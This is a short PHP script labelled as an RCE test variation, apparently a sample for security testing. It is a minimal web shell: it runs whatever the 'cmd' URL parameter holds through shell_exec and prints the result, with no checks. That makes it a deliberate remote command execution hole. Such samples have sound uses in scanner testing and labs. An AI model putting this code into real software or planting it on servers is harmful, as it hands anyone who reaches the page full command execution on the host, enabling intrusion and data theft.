<?php
// RCE test variation #802
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>